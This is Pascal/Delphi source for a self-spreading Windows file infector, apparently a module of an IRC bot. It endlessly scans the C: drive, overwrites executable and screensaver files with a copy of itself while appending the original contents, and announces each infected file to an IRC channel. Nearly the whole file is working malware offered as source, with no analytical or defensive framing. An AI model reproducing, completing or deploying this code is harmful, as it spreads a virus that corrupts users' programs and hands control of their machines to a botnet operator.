{ Created by p0ke. }
Unit pe_spreader;

Interface

{$DEFINE Stats}

uses
  Windows{$IFDEF Stats}, stats_spreader{$ENDIF}, scan_spread, TLHelp32;
  
Procedure StartInfector;

Implementation

function StrtoInt(const S: string): integer; var E: integer;
begin Val(S, Result, E);end;
function InttoStr(const Value: integer): string; var S: string[11];
begin Str(Value, S); Result := S; end;

function GetRandName: String;
Var
  Name: String;
Begin
  Str(GetTickCount, Name);
  Result := Name+'.exe';
End;

function ExtractFileExt(const Filename: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  If Pos('.', Filename) = 0 Then
  Begin
    Result := '';
    Exit;
  End;
  L := Length(Filename);
  for i := L downto 1 do
  begin
    Ch := Filename[i];
    if (Ch = '.') then
    begin
      Result := Copy(Filename, i + 1, Length(Filename));
      Break;
    end;
  end;
end;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

// --- modified function (orginally by HaTcHeT)
Procedure ReadFileStr(Name: String; Var Output: String);
Var
  cFile :File Of Char;
  Buf   :Array [1..1024] Of Char;
  Len   :LongInt;
  Size  :LongInt;
Begin
  Try
    Output := '';

    AssignFile(cFile, Name);
    Reset(cFile);
    Size := FileSize(cFile);
    While Not (Eof(cFile)) Do
    Begin
      BlockRead(cFile, Buf, 1024, Len);
      Output := Output + String(Buf);
    End;
    CloseFile(cFile);

    If Length(Output) > Size Then
      Output := Copy(Output, 1, Size);
  Except
    ;
  End;
End;

// --- modified function (orginally by HaTcHeT)
Procedure InfectFile(Name: String);
Var
  FileBuffer    :String;
  EncBuffer     :String;
  Settings      :String;
  F             :TextFile;
Begin
  If (Name = ParamStr(0)) Then Exit;

  FileBuffer := '';
  ReadFileStr(Name, FileBuffer);
  If (FileBuffer = '') Then Exit;

  If Pos('pe\flipside\opensource', FileBuffer) > 0 Then Exit;
  If Not (CopyFile(pChar(ParamStr(0)), pChar(Name), False)) Then Exit;

  Settings := #00 + GetRandName + #02 + IntToStr(Length(FileBuffer)) + #01;

  EncBuffer := FileBuffer;

  AssignFile(F, Name);
  Append(F);
  Write(F, EncBuffer);
  Write(F, Settings);
  CloseFile(F);

  {$IFDEF Stats}
    Inc(PE_Infect);
    Bot.SendRAW('PRIVMSG '+Bot.Channel+' :[pe:'+ExtractFileName(Name)+']'#10);
  {$ENDIF}
End;

function IsRunning(Name: string): bool;
const
  PROCESS_TERMINATE=$0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
  Len: Integer;
  name1, name2, name3: string;
begin
  result := False;

  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

  while integer(ContinueLoop) <> 0 do
  begin
    Len := Length(FProcessEntry32.szExeFile);

    Name1 := UpperCase(ExtractFileName(FProcessEntry32.szExeFile));
    Name2 := UpperCase(Copy(Name, 1, Len));
    Name3 := UpperCase(FProcessEntry32.szExeFile);

    If (Name1 = Name2) Or (Name3 = Name2) Then Result := True;
    ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function GetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;

Procedure StartScan(Dir: String);
Var
  SearchRec	:TSearchRec;
Begin
  Try
    If (Dir[Length(Dir)] <> '\') Then Dir := Dir + '\';
    
    If (FindFirst(Dir + '*.*', faDirectory, SearchRec) = 0) Then
    Repeat
      If ((SearchRec.Attr and faDirectory) = faDirectory) and
          (SearchRec.Name[1] <> '.') Then
          Begin
            If (UpperCase(SearchRec.Name) <> 'WINDOWS') and
               (UpperCase(SearchRec.Name) <> 'WINNT') Then
                 StartScan(Dir + SearchRec.Name);
          End Else
          Begin
            If (SearchRec.Name[1] <> '.') Then
            Begin
              if (GetFileSize(SearchRec.Name) < 500000) Then
              Begin
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'EXE') Then
                  If Not (IsRunning(Dir + SearchRec.Name)) Then InfectFile(Dir + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'SCR') Then
                  If Not (IsRunning(Dir + SearchRec.Name)) Then InfectFile(Dir + SearchRec.Name);
              End;
            End;
          End;
      Sleep(512);
    Until (FindNext(SearchRec) <> 0);
    FindClose(SearchRec);
  Except
    FindClose(SearchRec);
    Exit;
  End;
End;

Procedure StartPE;
Begin
  Repeat
    StartScan('C:\');
  Until (1=2);
End;

Procedure StartInfector;
Var
  ThreadID: DWord;
Begin
  CreateThread(NIL, 0, @StartPE, NIL, 0, ThreadID);
End;

end.